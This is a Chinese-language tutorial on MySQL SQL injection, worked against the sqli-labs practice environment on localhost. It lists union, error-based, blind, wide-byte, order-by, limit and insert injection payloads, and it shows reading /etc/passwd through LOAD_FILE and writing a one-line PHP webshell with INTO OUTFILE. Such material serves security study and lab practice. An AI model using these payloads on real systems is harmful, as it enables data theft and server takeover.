## 前言

SQL 注入就是指，在输入的字符串中注入 SQL 语句，如果应用相信用户的输入而对输入的字符串没进行任何的过滤处理，那么这些注入进去的 SQL 语句就会被数据库误认为是正常的 SQL 语句而被执行。

恶意使用 SQL 注入攻击的人可以通过构建不同的 SQL 语句进行脱裤、命令执行、写 Webshell、读取度武器敏感系统文件等恶意行为。

## 识别后台数据库

### 根据web语言

**Microsoft  SQL  Server:** ASP和.Net

**Mysql:** PHP

**Oracle/Mysql:** java

(以下内容都基础Mysql数据库进行注入，其他数据库原理大同小异。)

## information_schema简介

在Mysql5.0以上引入了一个信息库-information_schema。其中保存了关于数据库所维护的其他数据库的所有信息。如数据库名，数据库的表，表栏的数据类型与访问权限等，这对我们在进行sql注入获取信息时候非常有帮助。

其中几个我们需要重点关注的数据表:

**SCHEMATA表**

提供了当前mysql实例中所有数据库的信息。是show databases的结果取之此表。

**TABLES表**

提供了关于数据库中的表的信息（包括视图）。详细表述了某个表属于哪个schema，表类型，表引擎，创建时间等信息。

**COLUMNS表**

提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。

## 注释符

因为在Sql注入中我们经常需要拼接闭合来执行我们想要的sql语句，注释符在其中发挥了重要的作用。

**常用的注释符如下:**

```txt
#
-- (有空格)或--+
/**/
```

其中--后面如果直接接字符Mysql会把他当做字符进行，所以我们需要在--后面添加空格。但是我们在get请求的时候URL会自动把后面的空格给忽略掉，所以我们可以使用+代替浏览器会自动帮我们编码为空格。

**内联注释**

``/*！...*/``

内联注释是MySQL为了保持与其他数据兼容，将MySQL中特有的语句放在/!...*/中，这些语句在不兼容的数据库中不执行，而在MySQL自身却能识别，执行。

例如``/*!50001*/``表示数据库版本>=5.00.01时中间的语句才能被执行,有趣的是只要但是当前的Sql版本大于内联注释版本都可以运行内联注释的语句，而不管里面的版本是否存在例如这里的12345。

![image-20201014201850804](http://picbed.easy233.top//imgimage-20201014201850804.png)

## 注入类型划分

**按照注入点的属性**

- 数字型
- 字符型

**基于注入点的位置**

- GET/POST型
- Cookie型
- head型

**基于注入的顺序**

- 一阶注入
- 二阶注入

**基于服务器返回的响应**

- 有回显
  - 联合查询
  - 堆查询注入
- 无回显
  - 布尔盲注
  - 延时盲注

## 联合查询

以sql-lib第一关为例子。

### 获取字段数

通过不断尝试改变order by后面的值来观察页面反应确定表的字段数。

```
http://127.0.0.1/sqli-labs/Less-1/?id=1' order by 3 --+ 
```

### 获取数据库名

```
http://127.0.0.1/sqli-labs/Less-1/?id=0' union select 1,2,group_concat(schema_name) from information_schema.schemata --+                   //获取所有数据名
http://127.0.0.1/sqli-labs/Less-1/?id=0' union select 1,2,database() --+  //查询当前数据库
```

### 获取数据表

```
http://127.0.0.1/sqli-labs/Less-1/?id=0' union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema="security")--+
```

### 获取表中的字段

这里建议查找列名的时候加上数据库限制条件，否则它会把所有数据库中同表名的字段都列举出来。

```
http://127.0.0.1/easy201020/sqli-labs/Less-1/?id=0' union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name="users" and table_schema="security")--+
```

### 获取各个字段值

```
http://127.0.0.1/sqli-labs/Less-1/?id=0' union select 1,2,(select group_concat(username) from users)--+
```

## 报错注入

报错函数有非常的多

### updatexml()

原理由于updatexml的第二个参数需要Xpath格式的字符串，以~开头的内容不是xml格式的语法，concat()函数为字符串连接函数显然不符合规则，但是会将括号内的执行结果以错误的形式报出，这样就可以实现报错注入了。

```
http://127.0.0.1/sqli-labs/Less-1/?id=' union select 1,2,updatexml(1,concat('~',database(),'~'),1) --+
```

注意该函数报错输入是有长度限制的，最大长度为32位，如果超出了限制我们就需要使用substring来进行函数截断。

```
http://127.0.0.1/sqli-labs/Less-1/?id=0' union select 1,3,updatexml(1,concat('~',substring((select group_concat(username) from users),31,50),'~'),1) --+
```

![image-20201015200112662](http://picbed.easy233.top//imgimage-20201015200112662.png)

### extractvalue()

 extractvalue注入的原理：依旧如同updatexml一样，extract的第二个参数要求是xpath格式字符串，而我们输入的并不是。所以报错。

但是注意该函数输入的两个参数,并且同updatexml一样最大长度为32

```
http://127.0.0.1/sqli-labs/Less-1/?id=0' union select 1,3,extractvalue(1,concat('~',database(),'~')) --+
```

### exp()

```
select exp(~(select * from(select user())a))
```

### floor()和rand()

```
http://127.0.0.1/sqli-labs/Less-1/?id=0'union select count(*),2,concat(':',(select database()),':',floor(rand()*2))as a from information_schema.tables group by a --+
```

### geometrycollection()

```
id=1 and geometrycollection((select * from(select * from(select user())a)b))
```

### multipoint()

```
id=1 and multipoint((select * from(select * from(select user())a)b))
```

###　polygon()

```
id=1 and polygon((select * from(select * from(select user())a)b))
```

### linestring()

```
id=1 and linestring((select * from(select * from(select user())a)b))
```

### multilinestring()

```
id=1 and multilinestring((select * from(select * from(select user())a)b))
```

## 盲注

盲注分为布尔盲注和时间盲注但是两者本质都是一样不过是判断的方式不一样罢了。

先介绍几个函数：

**length(str)** ：返回字符串str的长度

**substr(str, pos, len)** ：将str从pos位置开始截取len长度的字符进行返回。注意这里的pos位置是从1开始的，不是数组的0开始

**mid(str,pos,len)** ：跟上面的一样，截取字符串

**ascii(str)** ：返回字符串str的最左面字符的ASCII代码值

**ord(str)** ：将字符或布尔类型转成ascll码

**if(a,b,c)** ：a为条件，a为true，返回b，否则返回c，如if(1>2,1,0),返回0

截取数据库的最左边一位判断器ascill为115,个人推荐使用ascill码形式判断，如果直接判断字符因为mysql是不区分大小写的所以爆出来的字符不确定和数据库里面的数据大小写是否相同。

布尔盲注:

```
http://127.0.0.1/easy201020/sqli-labs/Less-1/?id=0' or ascii(substr((select database()),1,1))=115 --+
```

时间盲注:

```
http://127.0.0.1/easy201020/sqli-labs/Less-1/?id=0' or if(ascii(substr((select database()),1,1))=115,sleep(5),1) --+
```

**BENCHMARK()**

BENCHMARK()函数重复countTimes次执行表达式expr，它可以用于计时MySQL处理表达式有多快。结果值总是0。

![image-20201015211213770](http://picbed.easy233.top//imgimage-20201015211213770.png)

## 宽字节注入

在使用PHP连接MySQL的时候，当设置“set character_set_client = gbk”时会导致一个编码转换的问题。我们知道GBK是占两个字节，当我们使用addslashes等函数时候,单引号被加上反斜杠\，这时候如果我们使用%df'的时候就会变成%df\’.其中\的十六进制是 %5C ，那么现在 `%df\’` =`%df%5c%27`，如果程序的默认字符集是GBK等宽字节字符集，则MySQL用GBK的编码时，会认为 `%df%5c` 是一个宽字符，也就是`縗`，也就是说：%df\’ = %df%5c%27=縗’，有了单引号就好注入了。

以sql-lib的三十二关为例子:

因为不能直接使用单引号了所以手工注入的方法也要稍稍做一下改变，使用16进制代替。

```
http://127.0.0.1/sqli-labs/Less-32/?id=0%df' union select 1,2,3 --+   
http://127.0.0.1/sqli-labs/Less-32/?id=0%df' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479 --+    //表
```

## order by注入

这种一般都是数字型注入，在后面加上``asc``  （结果升序显示）、``desc``（结果降序显示）来观察其顺序是否改变就行了。顺序改变了，所以存在注入。或者使用算术例如``2-1``观看变化

以sql-lib的第46关为例子：

### 报错注入

这里可以直接使用报错注入，其实报错注入的使用性是非常广泛的基本有报错回显都可以直接使用

```
http://127.0.0.1/SQli-labs/Less-46/?sort=1 and updatexml(1,concat('~',database(),'~'),1) --+
```

## 盲注

[参考](https://www.cnblogs.com/wangtanzhi/p/12590172.html)

```
select * from ha order by if(1=1,1,sleep(1)); #正常时间
select * from ha order by if(1=2,1,sleep(1)); #有延迟
```

## limit注入

[参考文章](https://www.freebuf.com/articles/web/57528.html)

Sql语句如下:

```mysql
SELECT field FROM table WHERE id > 0 ORDER BY id LIMIT 【注入点】
```

### 报错注入

```mysql
SELECT field FROM user WHERE id >0 ORDER BY id LIMIT 1,1 procedureanalyse(extractvalue(rand(),concat(0x3a,version())),1);
```

### 延时注入

注意这里不能够使用sleep语句而只能用 BENCHMARK。

```mysql
SELECT field FROM table WHERE id > 0 ORDER BY id LIMIT 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)
```

# insert、update和delete 注入方法

### 闭合后构造

例如注入语句如下:

```
Insert into users value(1，'注入点','xx');
```

我们可以先把注入点闭合然后在后面使用不被单引号闭合的select语句，将查询结果插入表中，然后再想办法通过正常途径查看。

```
insert users value (15,'',database())#);
```

![image-20201016171126185](http://picbed.easy233.top//imgimage-20201016171126185.png)

**对于非SELECT注入，如果成功执行的话会修改数据库数据。实战过程中不但会破坏数据库结构（白帽子挖洞的时候很可能因为这个违法），还容易引起管理员注意。所以在不让SQL语句正常执行的情况下获取数据是最好的方法。**

存在注入的语句如下:

```mysql
Insert into users value(1，'注入点','xx');
```

### 报错注入

如果存在报错注入则一切皆大欢喜了。

payload:

```mysql
xx' and updatexml(1,concat('~',database(),'~'),1),'xx') #
```

注入后的语句：

```mysql
Insert into users value(1,'xx' and updatexml(1,concat('~',database(),'~'),1),'xx') # 'xx')
```

## Mysql读写文件

### 文件操作权限

在Mysql中存在一个称为secure_file_priv的全局系统变量。 该变量用于限制数据的导入和导出操作。如果该变量为空则那么可以直接使用函数读写数据，如果为null则不能用

在mysql的5.5.53之前的版本是默认为空,之后的版本为null,所以是将这个功能禁掉了

![image-20201018163320415](http://picbed.easy233.top//imgimage-20201018163320415.png)

### 读取文件

```
读文件函数LOAD_FILE()
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE(0x2F6574632F706173737764);
```

注意点：

1. LOAD_FILE的默认目录@@datadir
2. 文件必须是当前用户可读
3. 读文件最大的为1047552个byte, @@max_allowed_packet可以查看文件读取最大值

### 写文件

```
INTO OUTFILE/DUMPFILE
SELECT "<? system($_GET['c']); ?>" INTO OUTFILE 'E:\1.php';

这两个函数都可以写文件，但是有很大的差别 

INTO OUTFILE函数写文件时会在每一行的结束自动加上换行符 
INTO DUMPFILE函数在写文件会保持文件得到原生内容，这种方式对于二进制文件是最好的选择 
```

注意点：

1. INTO OUTFILE不会覆盖文件
2. INTO OUTFILE必须是查询语句的最后一句
3. 路径名是不能编码的，必须使用单引号.

## 参考文章

[注入笔记](https://www.smi1e.top/sql%e6%b3%a8%e5%85%a5%e7%ac%94%e8%ae%b0/#i)

[SQL 注入总结](https://xz.aliyun.com/t/2869)

